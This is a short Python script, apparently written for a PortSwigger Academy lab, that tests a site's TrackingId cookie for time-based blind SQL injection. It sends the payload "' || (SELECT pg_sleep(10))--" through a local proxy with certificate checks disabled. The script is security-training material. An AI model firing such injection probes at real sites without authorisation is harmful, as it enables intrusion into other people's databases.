#!/usr/bin/python3

import sys
import requests
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> Blind SQL injection with time delays')
        print('    >> by Port Swigger Academy\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def blind_sqli_check(url):
    sqli_payload = "' || (SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {
        'TrackingId':'7oZwYhSCWpEnrXFw' + sqli_payload_encoded, 
        'session': 'yqpoIYrqCWg23PApZAG0Wf4RxCzyhbxi'
    }
    response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if int(response.elapsed.total_seconds()) > 10:
        output.success("Vulnerable to blind-based SQL Injection")
    else:
        output.error("Not vulnerable to blind-based SQL Injection")

def main():
    if len(sys.argv) !=2:
        output.info("Usage: %s <url>" % sys.argv[0])
        output.info("Example: %s <url>" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    output.info("Checking if traing cookie is vulnerable to time-based blind SQLi")
    blind_sqli_check(url)

if __name__ == "__main__":
    main()
